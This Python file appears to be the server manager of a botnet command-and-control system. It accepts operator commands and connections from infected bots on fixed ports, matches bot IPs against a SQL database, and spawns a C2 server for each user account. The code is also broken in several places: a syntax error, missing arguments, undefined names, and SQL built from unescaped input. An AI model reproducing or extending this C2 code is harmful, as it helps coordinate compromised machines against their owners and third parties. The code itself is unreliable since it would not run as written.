import threading
import socket
import sys
import json
import pyodbc

import command
import c2server
from botnet_exceptions import *


class ServerManager():
    def __init__(self, command_entry_address, bot_entry_address):
        self.command_entry_address = command_entry_address
        self.bot_entry_address = bot_entry_address
        self.bot_clusters = {}
        self.commands_in_process = []
        self.c2servers = []
        self.connection_string = self.get_connection_string("botnet")

    def get_connection_string(database):
        f = open("databaseconfig.json", r)
        config = json.load(f)

        driver = "{ODBC Driver 17 for SQL Server}"
        databaseconfig = config["botnet"]
        server = databaseconfig["Server"]
        database = databaseconfig["Database"]
        uid = databaseconfig["UID"]
        pwd = databaseconfig["PWD"]

        return "Driver="+driver+";Server="+server+";Database="+database+";UID="+uid+";PWD="+pwd+";"

    def listen_for_commands(self):
        """
        Listen for incoming commands
        :return: None
        """
        command_socket = self.create_socket(self.command_entry_address)

        while True:
            try:
                command_socket, command_address = commands_socket.accept()
            except:
                print("[-] Accepting command connection failed")
                break

            try:
                command = command_socket.recv(1024)
                command = json.load(command.decode())
                command = Command(**command)
            except:
                print("[-] Incoming command invalid")
                break

            self.commands_in_process.append(command)

            command_thread = threading.Thread(target=self.assign_command, args=(command_socket, command))
            command_thread.start()

    def assign_command(self, command_socket, command):
        c2server = self.does_c2server_exist(command.user_id)

        if c2server is None:
            c2server = self.spawn_c2server()

        command_socket.sendall(b'Command was properly processed')
        try:
            c2server.execute_command(command)
        except NoBotsException:
            command_socket.sendall(b'No bots available for this account')
        else:
            command_socket.sendall(b'Command executed')
        finally:
            command_socket.close()

    def listen_for_bots(self):
        """
        Listen for incoming bots
        :return: None
        """
        bots_socket = self.create_socket(self.bot_entry_address)

        while True:
            try:
                bot_socket, bot_address = bots_socket.accept()
            except:
                print("[-] Accepting bot connection failed")
                break

            bot_ip = bot_address[0]

            db = pyodbc.connect(self.connection_string)
            with db:
                cursor = db.cursor()
                cursor.execute(f"SELECT * FROM Bot WHERE IP='{bot_ip}'")

                if cursor.rowcount == 0:
                    print("[-] IP doesn't exist in the database")
                    bot_socket.sendall(b"IP doesn't exist in the database")
                    bot_socket.close()
                    break
                
                row = cursor.fetchone()
                user_id = row[1]

                c2server = does_c2server_exist(user_id)
                if c2server is None:
                    self.spawn_c2server(user_id, bot_socket)
                else:
                    c2server.bots.append(bot_socket)


    def does_c2server_exist(self, user_id):
        """
        Checks if c2server exists. If so, return the c2server object.
        :param user_id: str
        :return: None or C2server
        """
        c2server = None

        for c2server_i in self.c2servers:
            if c2server_i.user_id == user_id:
                c2server = c2server_i
                break

        return c2server


    def spawn_c2server(self, user_id, bot_socket):
        """
        Spawn new C2 server when no available bot cluster is present
        :param user_id: str
        :return: C2server
        """
        c2server = C2server(user_id, bot_socket)
        self.c2servers.append(c2server)
        return c2server

    def create_socket(self, address)
        try:
            commands_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            commands_socket.bind(address)
            commands_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            commands_socket.listen()
        except:
            print("[-] Commands socket setup failed")
            sys.exit()

        return commands_socket



if __name__ == "__main__":
    command_entry_address = ('', 4590)
    bot_entry_address = ('', 4591)
    serverManager = ServerManager(command_entry_address, bot_entry_address)
    command_thread = threading.Thread(target=serverManager.listen_for_commands)
    command_thread.start()
    bot_thread = threading.Thread(target=serverManager.listen_for_bots)
    bot_thread.start()


